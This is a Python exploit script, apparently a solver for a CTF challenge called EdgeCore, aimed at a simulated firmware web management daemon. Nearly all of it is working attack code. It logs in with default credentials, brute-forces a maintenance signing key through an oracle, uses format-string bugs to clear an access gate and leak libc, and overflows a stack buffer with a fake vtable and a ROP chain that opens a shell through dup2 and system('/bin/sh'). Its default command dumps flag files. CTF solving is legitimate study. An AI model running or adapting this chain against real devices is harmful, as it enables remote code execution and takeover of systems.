#!/usr/bin/env python3
"""12071 · EdgeCore (2026 羊城杯 / DASCTF) — reproducible exploit.

Target: EdgeCore FW-2000 web management daemon (`edgecore`, x86-64, no PIE,
no canary, partial RELRO, NX) listening on tcp/9999, shipped with the
matching glibc 2.39 (libc.so.6 / ld-linux-x86-64.so.2).

Vulnerability
-------------
POST /api/vpn/client (handler at 0x404d65) takes the raw body and does
`memcpy(stack_buf /*2288B*/, body, len)` for len in [0x8f1, limit], where
limit = 0x900 + ((pid ^ 0x4d96d60c) & 0x3f).  The oversized copy smashes the
"capabilities object" that follows the buffer, and the handler then performs
an indirect virtual call through attacker-controlled memory:

    r8  = *(*(buf+0x8f0))      ; vtable[0]  -- fully attacker controlled
    rdi = buf+0x8f0 ; rsi = sockfd ; rdx = buf ; rcx = sockfd
    call r8

The public path is gated by DAT_004139b0 (initialised to 1 -> HTTP 403
"signed maintenance session required").  The only writer of that dword is the
diagnostics endpoint's format string, which needs a valid
`x-diag-signature` = fnv1a64(KEY | nonce | fmt) (lowercase %016x), where KEY
is /etc/edgecore/maintenance.key and nonce comes from /api/maintenance.

Chain
-----
  1. login                     POST /login (defaults admin / EdgeCore@2025)
  2. nonce                     GET  /api/maintenance
  3. signed diag fmt="%1$n"    -> writes 0 into DAT_004139b0 (gate open)
  4. signed diag fmt="%196$s"  -> query param `x` plants a pointer to
                                  recv@got on the stack; %s dereferences it
                                  -> libc base
  5. GET vpn (empty body)      -> {"record":"0x<stack>"} leak of the buffer
  6. POST vpn (0x900 bytes)    -> fake vtable -> libc `mov rsp,rdx; ret`
                                  -> ROP: dup2(sockfd,0/1); system("/bin/sh")

Usage
-----
  python3 12071-solve.py <host> <port> [key]
  (omit key to try a built-in candidate list first)
"""
import argparse, hashlib, itertools, json, os, re, socket, struct, sys, time

# ---- libc.so.6 (Ubuntu GLIBC 2.39-0ubuntu8.9) offsets -----------------------
OFF_RECV = 0x12BE40
OFF_SYSTEM = 0x58750
OFF_DUP2 = 0x116C30
OFF_POP_RDI = 0x10C08D
OFF_POP_RSI = 0x110B7D
OFF_BINSH = 0x1CC42F
OFF_PIVOT = 0x5EF6F            # mov rsp, rdx ; ret
RECV_GOT = 0x413070            # recv@got (binary is non-PIE)
GATE = 0x4139B0                # DAT_004139b0
SLOT = 196                     # stack slot of the query-planted pointer
MAXLEN = 0x900                 # always <= the per-process limit


def fnv1a64(b):
    h = 0xcbf29ce484222325
    for c in b:
        h = ((h ^ c) * 0x100000001b3) & 0xFFFFFFFFFFFFFFFF
    return h


def p64(x):
    return struct.pack('<Q', x)


class Client:
    def __init__(self, host, port, timeout=6):
        self.host, self.port, self.timeout = host, port, timeout
        self.cookie = None

    def raw(self, req):
        s = socket.create_connection((self.host, self.port), timeout=self.timeout)
        s.sendall(req)
        d = b''
        try:
            while True:
                b = s.recv(65536)
                if not b:
                    break
                d += b
        except socket.timeout:
            pass
        s.close()
        return d

    def req(self, method, path, body=b'', headers=None):
        h = [b'Host: x', b'Connection: close']
        if self.cookie:
            h.append(b'Cookie: SESSION=' + self.cookie.encode())
        if method == 'POST':
            h.append(b'Content-Length: ' + str(len(body)).encode())
        for k, v in (headers or {}).items():
            if isinstance(v, str):
                v = v.encode('latin1')
            h.append(k.encode() + b': ' + v)
        return self.raw((method + ' ' + path + ' HTTP/1.1\r\n').encode() + b'\r\n'.join(h) + b'\r\n\r\n' + body)


def split(resp):
    head, _, body = resp.partition(b'\r\n\r\n')
    return head, body


def unescape(b):
    out, i = bytearray(), 0
    while i < len(b):
        if b[i] == 0x5c and i + 1 < len(b):
            n = b[i + 1]
            m = {ord('n'): 10, ord('r'): 13, ord('t'): 9, 0x5c: 0x5c, 0x22: 0x22, 0x2f: 0x2f}
            if n in m:
                out.append(m[n]); i += 2; continue
            if n == ord('u') and i + 5 < len(b):
                out.append(int(b[i + 2:i + 6], 16) & 0xFF); i += 6; continue
            i += 1; continue
        out.append(b[i]); i += 1
    return bytes(out)


def login(c, user='admin', pw='EdgeCore@2025'):
    body = ('username=%s&password=%s' % (user, pw)).encode()
    head, _ = split(c.req('POST', '/login', body,
                          {'Content-Type': 'application/x-www-form-urlencoded'}))
    m = re.search(rb'SESSION=([0-9a-f]+)', head)
    if not m:
        return False
    c.cookie = m.group(1).decode()
    return True


def nonce(c):
    return json.loads(split(c.req('GET', '/api/maintenance'))[1])['nonce'].encode()


def sdiag(c, key, non, fmt, plant=None):
    sig = '%016x' % fnv1a64(key + b'|' + non + b'|' + fmt)
    q = (b'x=' + p64(plant) + b'&') if plant is not None else b''
    q += b'fmt=' + fmt.replace(b'%', b'%25').replace(b'$', b'%24')
    return c.req('GET', '/api/diag?' + q.decode('latin1'), headers={'x-diag-signature': sig})


def diag_out(resp):
    body = split(resp)[1]
    m = re.match(rb'.*"output":"(.*)"\}\s*$', body, re.S)
    return unescape(m.group(1)) if m else body


def rop_chain(libc, sockfd):
    return (p64(libc + OFF_POP_RDI) + p64(sockfd) + p64(libc + OFF_POP_RSI) + p64(0) + p64(libc + OFF_DUP2) +
            p64(libc + OFF_POP_RDI) + p64(sockfd) + p64(libc + OFF_POP_RSI) + p64(1) + p64(libc + OFF_DUP2) +
            p64(libc + OFF_POP_RDI) + p64(libc + OFF_BINSH) + p64(libc + OFF_SYSTEM))


def find_data_root(hint):
    """locate the unpacked firmware (dir containing rootfs/etc/edgecore or the .ecfw)"""
    cands = [hint,
             os.path.join(hint, '..', 'work', '12071_edgecore'),
             os.path.join(hint, 'work', '12071_edgecore'),
             os.path.join(hint, '..', '..', 'work', '12071_edgecore'),
             os.path.join(hint, 'firmware', '12071_EdgeCore'),
             os.path.join(hint, '..', 'firmware', '12071_EdgeCore'),
             'work/12071_edgecore', 'firmware/12071_EdgeCore']
    for c in cands:
        if not c:
            continue
        if (os.path.isdir(os.path.join(c, 'rootfs/etc/edgecore')) or
                os.path.isfile(os.path.join(c, 'edgecore-fw2000-rootfs.ecfw'))):
            return os.path.abspath(c)
    return hint


def key_candidates(data_root):
    """data_root: dir with rootfs/etc/edgecore/*.enc and the .ecfw"""
    data_root = find_data_root(data_root)
    out, seen = [], set()

    def add(b):
        if isinstance(b, str):
            b = b.encode('latin1')
        if b not in seen:
            seen.add(b); out.append(b)

    try:
        enc = open(os.path.join(data_root, 'rootfs/etc/edgecore/maintenance.key.enc'), 'rb').read()
        encd = open(os.path.join(data_root, 'rootfs/etc/edgecore/maintenance.key.decoy.enc'), 'rb').read()
        ecfw = open(os.path.join(data_root, 'edgecore-fw2000-rootfs.ecfw'), 'rb').read()
        H = ecfw[0x10:0x20]
    except OSError:
        enc = encd = b''
        H = b''
    for b in (enc, encd, enc[24:], encd[24:], enc.hex(), encd.hex(), enc.rstrip(b'\n')):
        if b:
            add(b)
    serials = ['EC2000-7.4.19-7E1D5A3C', 'EC2000-7.4.19-5A3C7E1D', '7E1D5A3C', '5A3C7E1D']
    for _s in serials:
        add(_s)
        add(hashlib.sha256(_s.encode()).hexdigest())
        add(hashlib.sha256(_s.encode()).digest())
    products = ['EdgeCore FW-2000', 'EDGECORE-FW-2000', 'EdgeCore', 'FW-2000']
    salts = ['', 'salt', 'ECFW', 'ECF1', 'edgecore', 'fw2000', '7.4.19', '20261019',
             H.hex(), H.hex().upper(), H.decode('latin1') if H else '']
    for salt, s, p, sep in itertools.product(salts, serials, products, ['|', '', ':', '-', '_']):
        add(sep.join([s, salt, p]))
    # --- hot list first (keeps the number of oracle connections small) ---
    for _h in ('EdgeCore@2025', 'EC2000-7.4.19-7E1D5A3C', '7E1D5A3C',
               'EC2000-7.4.19-5A3C7E1D', '5A3C7E1D', 'maintenance', 'maintenance.key',
               'edgecore', 'ECFW', 'ECF1', 'fw2000', 'EdgeCore', 'EDGECORE-FW-2000',
               'EdgeCore FW-2000', 'operator', 'admin'):
        add(_h)
        add(hashlib.sha256(_h.encode()).hexdigest())
        add(hashlib.sha256(_h.encode()).digest())
        add(hashlib.md5(_h.encode()).hexdigest())
        add(hashlib.sha256(_h.encode()).hexdigest().upper())
    words = set()
    for s in ('admin', 'EdgeCore@2025', 'maintenance', 'maintenance.key', 'maintenance_key',
              'edgecore', 'EC2000', 'fw2000', 'EDGECORE-FW-2000', 'operator', 'changeme',
              'secret', 'default', 'fw-mgmt', 'id_rsa', 'password', 'EdgeCore', 'ECFW', 'ECF1',
              '5A3C7E1D', '7E1D5A3C', '0x5A3C7E1D', 'fwops', 'root', 'nobody'):
        words.add(s)
    # every interesting string from the shipped rootfs
    try:
        for dirpath, _, files in os.walk(os.path.join(data_root, 'rootfs')):
            for fn in files:
                if fn.endswith(('.enc', '.pem')) or fn == 'edgecore':
                    continue
                try:
                    txt = open(os.path.join(dirpath, fn), 'rb').read().decode('latin1')
                except OSError:
                    continue
                for tok in re.split(r'[^0-9A-Za-z@._-]+', txt):
                    tok = tok.strip('@._-')
                    if 4 <= len(tok) <= 64:
                        words.add(tok)
    except OSError:
        pass
    for s in words:
        add(s)
        add(hashlib.sha256(s.encode('latin1')).hexdigest())
        add(hashlib.sha256(s.encode('latin1')).digest())
        add(hashlib.md5(s.encode('latin1')).hexdigest())
        add('sha256:' + hashlib.sha256(s.encode('latin1')).hexdigest())
    # move the most plausible keys to the front (fewest oracle connections)
    hot = {b'EdgeCore@2025', b'EC2000-7.4.19-7E1D5A3C', b'7E1D5A3C',
           b'EC2000-7.4.19-5A3C7E1D', b'5A3C7E1D', b'maintenance', b'maintenance.key',
           b'edgecore', b'ECFW', b'ECF1', b'fw2000', b'EdgeCore', b'EDGECORE-FW-2000',
           b'EdgeCore FW-2000', b'operator', b'admin'}
    out.sort(key=lambda v: 0 if v in hot else 1)
    return out


def find_key(c, non, data_root, log=print, max_keys=0):
    cands = key_candidates(data_root)
    if max_keys:
        cands = cands[:max_keys]
    for kb in cands:
        try:
            r = sdiag(c, kb, non, b'%1$n')
        except Exception:
            continue
        if b'200' in split(r)[0].split(b'\r\n')[0]:
            log('[+] maintenance key found: %r' % kb)
            return kb
    return None


def run(host, port, key=None, data_root='.', log=print):
    c = Client(host, port)
    if not login(c):
        log('[!] login failed')
        return None
    log('[*] logged in (SESSION=%s)' % c.cookie)
    non = nonce(c)
    log('[*] nonce=%s' % non.decode())
    if key is None:
        key = find_key(c, non, data_root, log,
                       max_keys=int(os.environ.get('EDGECORE_MAXKEYS', '0') or 0))
        if key is None:
            log('[-] no candidate key matched; supply the key explicitly')
            return None
    else:
        key = key.encode('latin1')
        r = sdiag(c, key, non, b'%1$n')
        if b'200' not in split(r)[0].split(b'\r\n')[0]:
            log('[!] signature rejected -> key is wrong')
            return None
        log('[*] gate cleared (DAT_004139b0 = 0)')

    r = sdiag(c, key, non, b'%' + str(SLOT).encode() + b'$s', plant=RECV_GOT)
    leak = diag_out(r)
    if len(leak) < 5:
        log('[!] libc leak failed: %r' % leak)
        return None
    libc = int.from_bytes(leak[:6] + b'\x00\x00', 'little') - OFF_RECV
    log('[*] libc base = %#x' % libc)

    r = c.req('POST', '/api/vpn/client', b'', {'Content-Type': 'application/octet-stream'})
    m = re.search(rb'"record":"0x([0-9a-f]+)"', split(r)[1])
    if not m:
        log('[!] stack leak failed: %r' % split(r)[1][:120])
        return None
    buf = int(m.group(1), 16)
    log('[*] stack buffer = %#x' % buf)

    payload = bytearray(b'A' * MAXLEN)
    ch = rop_chain(libc, 4)
    payload[0:len(ch)] = ch
    payload[0x8F0:0x8F8] = p64(buf + 0x8F8)          # fake object -> fake vtable
    payload[0x8F8:0x900] = p64(libc + OFF_PIVOT)     # vtable[0] = pivot

    s = socket.create_connection((host, port), timeout=8)
    s.sendall(b'POST /api/vpn/client HTTP/1.1\r\nHost: x\r\nConnection: close\r\n'
              b'Cookie: SESSION=' + c.cookie.encode() + b'\r\n'
              b'Content-Type: application/octet-stream\r\n'
              b'Content-Length: ' + str(len(payload)).encode() + b'\r\n\r\n' + bytes(payload))
    log('[*] payload sent (len=%d)' % len(payload))
    return s


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('host')
    ap.add_argument('port', type=int)
    ap.add_argument('key', nargs='?')
    ap.add_argument('--cmd', default='id; ls -la /; cat /flag* 2>/dev/null; cat /home/*/flag* 2>/dev/null; echo ===END===')
    a = ap.parse_args()
    root = os.environ.get('EDGECORE_DATA', os.path.dirname(os.path.abspath(__file__)))
    s = run(a.host, a.port, a.key, root)
    if s is None:
        sys.exit(1)
    time.sleep(0.4)
    s.sendall(a.cmd.encode() + b'\n')
    s.settimeout(6)
    out, t0 = b'', time.time()
    while time.time() - t0 < 5:
        try:
            d = s.recv(4096)
            if not d:
                break
            out += d
        except socket.timeout:
            break
        if b'===END===' in out:
            break
    sys.stdout.write(out.decode('latin1'))
    sys.stdout.flush()


if __name__ == '__main__':
    main()
